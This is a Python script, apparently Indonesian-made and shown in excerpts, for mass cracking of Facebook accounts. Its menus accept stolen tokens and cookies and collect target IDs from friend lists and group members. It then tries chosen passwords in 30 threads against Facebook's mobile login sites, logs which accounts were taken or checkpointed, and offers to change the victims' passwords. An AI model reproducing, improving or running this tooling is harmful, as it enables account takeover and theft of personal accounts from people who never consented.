...
_____        ___   ___ ______ 
   ...
   / /\ \  \___ \______| | | | | | | / /  
  / ____ \ ____) |     | |_| | |_| |/ /   
 /_/    \_\_____/       \___/ \___//_/ZWEX FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : ITZ AS 007                   {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +880....................          {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/itz-as007{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Premium{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 64bit                   {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-0.1 ({K}ZWEX{P})            {N}║")
    print("╚════════════════════════════════════════╝")
#CRACK DONE
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY NAZIR-XD ZWEX SC DONE...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(K,N,K,str(len(cp)),N))
        cek_cp = input(f"{N}══════════════════════════════════════════\n [{K}?{N}] Tampilkan opsi detektor CP [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Example password: {H}admin123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                Street(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[NAZIR-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[AS-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sProses pengecekan selesai%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Return SC type "%python META.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python copy3.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didn't get results'%(N,M,N));exit()
#LOGIN SC
user = "meta"
pwas = "metaroyid"
def cek_pw():
    try:
        ...
        os.system("clear")
        logo()
        print(' [%s!%s] Choose number 2 if someone is selling it\n Buy SC META. SC ini %sGRATIS%s'%(M,N,H,N))
        print('\n %s%sOPTION MENU%s'%(BM,P,N))
        print(' [%s1%s] Already have Login Info SC'%(H,N))
        print(' [%s2%s] Send a message to the Author'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);cek_pw()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sYou will be directed to Whatsapp Penulis..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/+8801826842231?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] Anda hYou will be directed toarus memiliki %nama pengguna & sandi%s untuk\n melanjutkan alat ini!'%(N,M,N,H,N))
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        #print(" %s[%s!%s] You must have a %susername & password%s to continue with this tool!"%(N,M,N,K,N))
        pw = input("\n %s[%s?%s] Masukkan nama pengguna : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Sorry don't be empty!"%(N,M,N));time.sleep(1);cek_pw()
        elif pw in user:
            jalan(" %s[%s✓%s] OK Username is correct"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Maaf, salah nama pengguna"%(N,M,N));time.sleep(1);cek_pw()
    moch_yayan()
def kska():
    xx = input("\n %s[%s?%s] Enter keywords : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan(" %s[%s!%s] Username is correct!"%(N,M,N));time.sleep(1);cek_pw()
    elif xx in pwas:
        jalan(" %s[%s✓%s] OK Kata sandi benar"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);moch_yayan()
    else:
        jalan(" %s[%s!%s] Maaf, Kata Sandi salah"%(N,M,N));time.sleep(1);cek_pw()
...
def yayanxd():
    ...
    print(' [%s1%s] Sign in with Token EAAB (%sON%s)'%(H,N,H,N))
    print(' [%s2%s] Sign in with Cookie (%sON%s)'%(H,N,H,N))
    print(' [%s3%s] Login with ID & Password (%sON%s)'%(H,N,H,N))
    print(' [%s4%s] convert Cookie ke Token EAAB (%sON%s)'%(H,N,H,N))
    print(' [%s5%s] Send a message to the Author (%sChat%s)'%(H,N,H,N))
    p = input(f"\n [{K}?{N}] Choose Login Method : ")
    if p =="":
        print(f"\n {N}[{M}!{N}] Don't be empty");time.sleep(3);yayanxd()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
...
def infoauthor():
        print("%s══════════════════════════════════════════"%(N))
        #jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}AS007\n {N}[{H}•{N}] Whatsapp : {K}+8801826842231\n {N}[{H}•{N}] Github : {K}https://github.com/itz-as007\n {N}[{H}•{N}] 
        ...
        if upd =="":
            ...
            os.system('xdg-open https://wa.me/+8801826842231?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
...
def login_cookie():
    ...
    try:
        ...
        jalan(' [%s!%s] Please use this sc properly, we are not responsible if this sc is misused...\n [%s•%s] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC META.'%(M,N,H,N));time.sleep(3)
        input('\n [%sPRESS ENTER%s] to continue'%(H,N))
        os.system('xdg-open https://wa.me/+8801826842231?text=Hallo+izin+menggunakan+SC+ini')
        moch_yayan()
...
def moch_yayan():
    ...
    try:
        ...
        print('\n %s[%s×%s] Cookie/Token kedaluwarsa'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    try:
        xx = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokenz)).json()
        nama = xx['name']
        idfb = xx['id']
    except KeyError:
        print('\n %s[%s×%s] Maaf, Cookie/Token tidak valid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Maaf tidak ada koneksi\n'%(N,M,N))
    ipm = requests.get(url_ip).json()
    IP = ipm["origin"]
    print(f" {BM}LOGIN INFO{N}")
    print(f"{P} [{H}•{P}] NAMA FB   : {nama}")
    print(f"{P} [{H}•{P}] ID FB     : {idfb}")
    print(f"{P} [{H}•{P}]  IP Account   : {IP}")
    print(f"{P} [{H}•{P}] Join      : {waktu}")
    print("%s══════════════════════════════════════════"%(N))
    print(f" {BM}MENU OPSI{N}")
    ...
    if pepek == '':
        jalan('\n %s[%s×%s] Maaf pilihan menunya salah...!'%(N,M,N));time.sleep(2);moch_yayan()
###### CRACK ID PUBLIK SINGEL #####
        ...
        try:
            ...
            except AttributeError:exit(f" {N}[{M}×{N}] ID Nama pengguna atau ID salah")
            ...
            jalan(f' %s[%s×%s] Maaf %sID bukan publik/Token tidak valid %s'%(N,M,N,M,N));time.sleep(1);moch_yayan()
...
###### CRACK GRUP #####
            ...
            if kontol in[""," "]:
                print('\n %s[%s×%s] Don't be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            else:
                try:
                    cookiz = open('.cokie.txt').read()
                    kueh  = {"cookie":cookiz}
                except IOError:
                    jalan(f"\n [{M}×{N}] Anda login menggunakan token, jika ingin crack dari anggota grup, silakan login cookie terlebih dahulu");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
                try:
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[AS007-OK] ","\x1b[1;92m[AS007-OK] ").replace("[AS-CP] ", "\x1b[1;93m[AS-CP] ")
...
def _ngocok_(__ppk__):
    try:
        print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
        nanya_keun = int(input(f' %s[%s?%s] Enter quantity target : %s'%(N,K,N,H)))
    except:nanya_keun=1
    print(f" %s[%s•%s] type %sme%s Crack from friends list"%(N,H,N,H,N))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f' %s[%s?%s] 
        except AttributeError:print(f" {N}[{M}×{N}] Nama pengguna atau ID tidak bersifat publik");continue
        try:
            ...
            jalan(f' %s[%s×%s] Maaf %sID Teman tidak untuk publik%s'%(N,M,N,M,N));continue
...
def gabut():
    ...
    files = input("\n %s[%s?%s] Masukkan file : %s"%(N,K,N,H))
    try:
        buka_baju = open(f'hasil/{files}','r').readlines()
    except IOError:
        print('\n [!] Maaf, filenya tidak ada');time.sleep(2);moch_yayan()
    ww=input(f"{N}══════════════════════════════════════════\n [{M}!{N}] Mainkan mode pesawat dulu.\n══════════════════════════════════════════\n {N}[{K}?{N}] Ubah kata sandi ketika {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: {K}")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"\n {N}[{H}•{N}] Contoh kata sandi : {H}admin123{N}")
        pwBar=input(f" [{K}?{N}] Masukan kata sandi baru : {K}")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] Kata sandi minimal 6 karakter'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print(f' %s[%s•%s] Total %s%s%s Akun'%(N,H,N,H,str(len(buka_baju)),N))
    print("%s══════════════════════════════════════════"%(N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split(' • ')
        print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
        jalan(f' {N}[{M}?{N}] Akun : {K}{kontol.replace("[AS-CP] ", "")}{N}')
        try:
            log_hasil(titid[0].replace("[AS-CP] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
    ...
    print("")
    jalan(' %s[%s✓%s] %sProses pengecekan selesai%s'%(N,H,N,H,N))
    jalan(' %s[%s✓%s] Retrun SC type "%spython copy3.py%s"'%(N,H,N,H,N));exit()
# CHEKPOINT DETEDTOR
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                print(' [%s!%s] Maaf, akun sudah terpasang A2F'%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f"[ALIM-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[ALIM-CP] {user} • {pasw}\n")
            print(" %s[%s•%s] There is %s option "%(N,H,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau telah diubah")
        open('results/INVALID-OK.txt', 'a').write(f"[ALIM-CP] {user} • {pasw}\n")
#UBAH PW
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        print(f'\r %s[%s!%s] %sMaaf tidak ada Apk Aktif%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sDetail Aplikasi Aktif Anda :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
              #print(f'\r %s[%s!%s] Maaf, Apk gagal memeriksa cookie yang tidak valid'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sMaaf tidak ada Apk yang kedaluwarsa%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sDetail Aplikasi Anda yang Kedaluwarsa :'%(M))
        for i in range(len(game)):
...
class __crack__:
    ...
    def tampilkan_apk(self):
        ...
        crot = input(f" {N}[{K}?{N}] Ingin menampilkan aplikasi terkait [{H}y{N}/{M}t{N}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Jangan kosong");self.tampilkan_apk()
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
            ...
            print(f" {N}[{M}×{N}] Pilih diantara y/t");self.tampilkan_apk()
# METODE SANDI MANUAL
    def plerr(self,id):
        self.id = id
        print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
        ___yayanganteng___ = input('%s══════════════════════════════════════════\n [%s?%s] Masukkan Kata Sandi SC (%srequired%s) : %s'%(N,K,N,H,N,H))
        if ___yayanganteng___ in ('raraY', 'raray'):
            self.tampilkan_apk()
            print('%s══════════════════════════════════════════\n %sDETAIL SANDI MANUAL%s'%(N,BM,N))
            ...
            while True:
                ...
                print(' %s[%s•%s] Kata Sandi Aktif : %s%s%s' % (N,H,N,H, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] Maaf salah...!'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] Kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            print('\n %s[%s×%s] Maaf salah...!'%(N,M,N));__yan__()
                        elif cin == '1':
                            ...
                            with YayanGanteng(max_workers=30) as (__A-S__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __A-S__.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__A-S__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __A-S__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass
                            ...
                            print(' [%s×%s] Maaf salah...!'%(N,M,N));__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
            ...
            jalan(' %s[%s×%s] Maaf, Kata Sandi SC salah'%(N,M,N));self.plerr(id)
